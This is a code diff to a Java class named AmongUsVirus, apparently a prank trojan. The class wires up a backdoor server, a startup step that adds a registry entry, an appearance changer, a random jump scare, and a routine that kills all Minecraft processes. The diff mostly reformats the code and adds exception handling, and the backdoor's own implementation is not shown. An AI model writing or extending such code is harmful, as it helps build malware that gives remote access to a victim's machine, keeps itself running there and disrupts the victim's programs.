@@ -6,28 +6,33 @@ import com.github.pulsebeat02.backdoor.ServerStartup;
 import com.github.pulsebeat02.jumpscare.RandomJumpScare;
 import com.github.pulsebeat02.utility.TaskUtilities;
 
+import java.net.URISyntaxException;
+
 public class AmongUsVirus {
 
-    private final BackDoorServer server;
-    private final ServerStartup startup;
-    private final RandomJumpScare jumpScare;
-    private final AppearanceChanger changer;
+  private final BackDoorServer server;
+  private final ServerStartup startup;
+  private final AppearanceChanger changer;
+  private RandomJumpScare jumpScare;
 
-    public AmongUsVirus() {
-        jumpScare = new RandomJumpScare();
-        server = new BackDoorServer();
-        startup = new ServerStartup();
-        startup.addRegistry();
-        changer = new AppearanceChanger();
-        killMinecraftTasks();
+  public AmongUsVirus() {
+    try {
+      jumpScare = new RandomJumpScare();
+    } catch (final URISyntaxException e) {
+      e.printStackTrace();
     }
+    server = new BackDoorServer();
+    startup = new ServerStartup();
+    startup.addRegistry();
+    changer = new AppearanceChanger();
+    killMinecraftTasks();
+  }
 
-    public void killMinecraftTasks() {
-        TaskUtilities.killAllTasks("Minecraft");
-    }
+  public static void main(final String[] args) throws URISyntaxException {
+    new RandomJumpScare();
+  }
 
-    public static void main(final String[] args) {
-
-    }
-
+  public void killMinecraftTasks() {
+    TaskUtilities.killAllTasks("Minecraft");
+  }
 }
